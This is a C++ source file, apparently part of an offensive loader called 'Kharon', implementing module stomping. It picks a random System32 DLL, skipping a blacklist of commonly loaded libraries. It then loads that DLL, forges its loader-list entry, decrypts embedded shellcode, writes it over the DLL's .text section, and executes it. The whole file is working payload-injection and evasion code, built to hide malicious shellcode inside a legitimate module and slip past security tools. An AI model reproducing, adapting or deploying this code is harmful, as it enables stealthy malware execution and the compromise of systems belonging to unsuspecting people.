#include <Kharon.h>

#if INJECTION_TECHNIQUE != INJECTION_TECHNIQUE_STOMPER

static const WCHAR* BlacklistedDlls[] = {
    L"msvcrt.dll",                  L"advapi32.dll",    L"rpcrt4.dll",
    L"sechost.dll",                 L"sspicli.dll",     L"cryptbase.dll",
    L"imm32.dll",                   L"iphlpapi.dll",    L"dhcpcsvc.dll",
    L"nsi.dll",                     L"winnsi.dll",      L"kernel32.dll",
    L"kernelbase.dll",              L"user32.dll",      L"gdi32.dll",
    L"gdi32full.dll",               L"msvcp_win.dll",   L"win32u.dll",
    L"mswsock.dll",                 L"ntdll.dll",       L"wininet.dll",
    L"ondemandconnroutehelper.dll", L"iertutil.dll",    L"kernel.appcore.dll",
    L"netutils.dll",                L"oleaut32.dll",    L"srvcli.dll",
    L"ucrtbase.dll",                L"urlmon.dll",      L"shell32.dll",
    L"wintypes.dll",                L"windows.storage.dll",
    L"combase.dll",                 L"profapi.dll",     L"shcore.dll",
    L"shlwapi.dll",                 L"winhttp.dll",     L"ws2_32.dll",
};

static const SIZE_T BlacklistedDllsCount = sizeof(BlacklistedDlls) / sizeof(*BlacklistedDlls);

static VOID StringToLower( WCHAR* String ) {
    for (; *String; String++)
        if (*String >= L'A' && *String <= L'Z')
            *String += 32;
}

static BOOL IsDllBlacklisted( const WCHAR* DllName ) {
    WCHAR Lower[64] = { 0 };

    for (INT i = 0; DllName[i] && i < 63; i++)
        Lower[i] = DllName[i];

    StringToLower(Lower);

    for (SIZE_T i = 0; i < BlacklistedDllsCount; i++)
        if (wcscmp(Lower, BlacklistedDlls[i]) == 0)
            return TRUE;

    return FALSE;
}

static SIZE_T GetTextSectionSizeFromDisk( const WCHAR* FilePath ) {
    SIZE_T TextSize = 0;

    HANDLE FileHandle = CreateFileW(FilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (FileHandle == INVALID_HANDLE_VALUE)
        return 0;

    LARGE_INTEGER FileSize = { 0 };
    if (!GetFileSizeEx(FileHandle, &FileSize) || FileSize.QuadPart < (LONGLONG)sizeof(IMAGE_DOS_HEADER)) {
        CloseHandle(FileHandle);
        return 0;
    }

    HANDLE Mapping = CreateFileMappingW(FileHandle, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!Mapping) {
        CloseHandle(FileHandle);
        return 0;
    }

    PVOID Base = MapViewOfFile(Mapping, FILE_MAP_READ, 0, 0, 0);
    if (!Base) {
        CloseHandle(Mapping);
        CloseHandle(FileHandle);
        return 0;
    }

    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)Base;

    if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        goto Cleanup;

    if (DosHeader->e_lfanew <= 0 ||
        (LONGLONG)DosHeader->e_lfanew + (LONGLONG)sizeof(IMAGE_NT_HEADERS) > FileSize.QuadPart)
        goto Cleanup;

    {
        PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)Base + DosHeader->e_lfanew);

        if (NtHeaders->Signature != IMAGE_NT_SIGNATURE)
            goto Cleanup;

        WORD SectionCount = NtHeaders->FileHeader.NumberOfSections;

        if (SectionCount == 0 || SectionCount > 96)
            goto Cleanup;

        PIMAGE_SECTION_HEADER Sections = IMAGE_FIRST_SECTION(NtHeaders);

        if ((PBYTE)(Sections + SectionCount) > (PBYTE)Base + FileSize.QuadPart)
            goto Cleanup;

        for (WORD i = 0; i < SectionCount; i++) {
            if (strncmp((CHAR*)Sections[i].Name, ".text", IMAGE_SIZEOF_SHORT_NAME) == 0) {
                TextSize = (SIZE_T)Sections[i].Misc.VirtualSize;
                break;
            }
        }
    }

Cleanup:
    UnmapViewOfFile(Base);
    CloseHandle(Mapping);
    CloseHandle(FileHandle);
    return TextSize;
}

static SIZE_T GetTextSectionAddress( SIZE_T ModuleBase ) {
    PIMAGE_DOS_HEADER     DosHeader  = (PIMAGE_DOS_HEADER)ModuleBase;
    PIMAGE_NT_HEADERS     NtHeaders  = (PIMAGE_NT_HEADERS)((PBYTE)ModuleBase + DosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER Sections   = IMAGE_FIRST_SECTION(NtHeaders);
    WORD                  SectionCount = NtHeaders->FileHeader.NumberOfSections;

    for (WORD i = 0; i < SectionCount; i++)
        if (strncmp((CHAR*)Sections[i].Name, ".text", IMAGE_SIZEOF_SHORT_NAME) == 0)
            return (SIZE_T)((PBYTE)ModuleBase + Sections[i].VirtualAddress);

    return 0;
}

static BOOL FixLdrEntry( SIZE_T ModuleBase ) {
    PIMAGE_DOS_HEADER     DosHeader  = (PIMAGE_DOS_HEADER)ModuleBase;
    PIMAGE_NT_HEADERS     NtHeaders  = (PIMAGE_NT_HEADERS)((PBYTE)ModuleBase + DosHeader->e_lfanew);
    PVOID                 EntryPoint = nullptr;
    PPEB                  Peb        = nullptr;
    PLIST_ENTRY           Head       = nullptr;
    PLIST_ENTRY           Entry      = nullptr;
    PLDR_DATA_TABLE_ENTRY LdrEntry   = nullptr;

    if (NtHeaders->OptionalHeader.AddressOfEntryPoint != 0)
        EntryPoint = (PVOID)(ModuleBase + NtHeaders->OptionalHeader.AddressOfEntryPoint);

    Peb   = NtCurrentPeb();
    Head  = &Peb->Ldr->InLoadOrderModuleList;
    Entry = Head->Flink;

    while (Entry != Head) {
        LdrEntry = CONTAINING_RECORD(Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if ((SIZE_T)LdrEntry->DllBase == ModuleBase) {
            LdrEntry->EntryPoint            = (PLDR_INIT_ROUTINE)EntryPoint;
            LdrEntry->Flags                 = 0xa47f32e0;
            LdrEntry->ImageDll              = 0x01;
            LdrEntry->LoadNotificationsSent = 0x01;
            LdrEntry->ProcessStaticImport   = 0x01;
            return TRUE;
        }

        Entry = Entry->Flink;
    }

    return FALSE;
}

static INT CollectCandidates( WCHAR Candidates[][MAX_PATH], INT MaxCount ) {
    WCHAR  SearchPath[MAX_PATH] = { 0 };
    INT    Count                = 0;

    WIN32_FIND_DATAW FileData   = { 0 };
    HANDLE           FindHandle = INVALID_HANDLE_VALUE;

    GetSystemDirectoryW(SearchPath, MAX_PATH);
    wcscat(SearchPath, L"\\*.dll");

    FindHandle = FindFirstFileW(SearchPath, &FileData);
    if (FindHandle == INVALID_HANDLE_VALUE)
        return 0;

    do {
        WCHAR  FullPath[MAX_PATH] = { 0 };
        SIZE_T TextSize           = 0;

        if (IsDllBlacklisted(FileData.cFileName))
            continue;

        GetSystemDirectoryW(FullPath, MAX_PATH);
        wcscat(FullPath, L"\\");
        wcscat(FullPath, FileData.cFileName);

        TextSize = GetTextSectionSizeFromDisk(FullPath);
        if (TextSize >= (SIZE_T)Shellcode::Size) {
            wcscpy(Candidates[Count++], FullPath);
            if (Count >= MaxCount)
                break;
        }

    } while (FindNextFileW(FindHandle, &FileData));

    FindClose(FindHandle);
    return Count;
}

auto Injection::Stomper( VOID ) -> VOID {
    INT    CandidateCount = 0;
    INT    ChosenIndex    = 0;
    WCHAR  ChosenPath[MAX_PATH] = { 0 };

    SIZE_T ModuleBase      = 0;
    SIZE_T TextSection     = 0;
    ULONG  OldProtection   = 0;
    BOOL   ProtectionChanged = FALSE;

    LPVOID DecryptedHeap   = nullptr;
    WCHAR (*Candidates)[MAX_PATH] = nullptr;

    auto CleanMask = [&]( const char* reason = nullptr, DWORD err = 0 ) -> VOID {
        if ( ProtectionChanged ) { VirtualProtect((LPVOID)TextSection, Shellcode::Size, OldProtection, &OldProtection); ProtectionChanged = FALSE; }
        if ( DecryptedHeap     ) { HeapFree(GetProcessHeap(), 0, DecryptedHeap); DecryptedHeap = nullptr; }
        if ( Candidates        ) { HeapFree(GetProcessHeap(), 0, Candidates); Candidates = nullptr; }
        if ( ModuleBase        ) { FreeLibrary((HMODULE)ModuleBase); ModuleBase = 0; }

        if ( reason && err ) DbgPrint( "%s (%d)\n", reason, err );
        else if ( reason )   DbgPrint( "%s\n", reason );
    };

    Candidates = (WCHAR(*)[MAX_PATH])HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, 256 * MAX_PATH * sizeof(WCHAR)
    );

    if ( !Candidates ) {
        return CleanMask( "HeapAlloc candidates failed", GetLastError() );
    }

    CandidateCount = CollectCandidates( Candidates, 256 );
    if ( CandidateCount == 0 ) {
        return CleanMask( "No suitable DLL candidate found", GetLastError() );
    }

    ChosenIndex = (INT)( GetTickCount() % (DWORD)CandidateCount );
    wcscpy( ChosenPath, Candidates[ChosenIndex] );

    HeapFree( GetProcessHeap(), 0, Candidates );
    Candidates = nullptr;

    ModuleBase = (SIZE_T)LoadLibraryExW( ChosenPath, nullptr, DONT_RESOLVE_DLL_REFERENCES );
    if ( !ModuleBase ) {
        return CleanMask( "LoadLibraryExW failed", GetLastError() );
    }

    if ( !FixLdrEntry( ModuleBase ) ) {
        return CleanMask( "FixLdrEntry failed", GetLastError() );
    }

    TextSection = GetTextSectionAddress( ModuleBase );
    if ( !TextSection ) {
        return CleanMask( "GetTextSectionAddress failed", GetLastError() );
    }

    DecryptedHeap = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, Shellcode::Size );
    if ( !DecryptedHeap ) {
        return CleanMask( "HeapAlloc shellcode failed", GetLastError() );
    }

    if ( Encryption::Decrypt( (UCHAR*)Shellcode::Data, (INT)Shellcode::Size, (UCHAR*)DecryptedHeap ) < 0 ) {
        return CleanMask( "Encryption::Decrypt failed", GetLastError() );
    }

    if ( !VirtualProtect( (LPVOID)TextSection, Shellcode::Size, PAGE_EXECUTE_READWRITE, &OldProtection ) ) {
        return CleanMask( "VirtualProtect RWX failed", GetLastError() );
    }
    ProtectionChanged = TRUE;

    memcpy( (LPVOID)TextSection, DecryptedHeap, Shellcode::Size );

    HeapFree( GetProcessHeap(), 0, DecryptedHeap );
    DecryptedHeap = nullptr;

    if ( !VirtualProtect( (LPVOID)TextSection, Shellcode::Size, OldProtection, &OldProtection ) ) {
        return CleanMask( "VirtualProtect restore failed", GetLastError() );
    }
    ProtectionChanged = FALSE;

    ModuleBase = 0;

    CleanMask();

    VOID (*Stomp)(VOID) = (decltype(Stomp))TextSection;
    Stomp();
}

#endif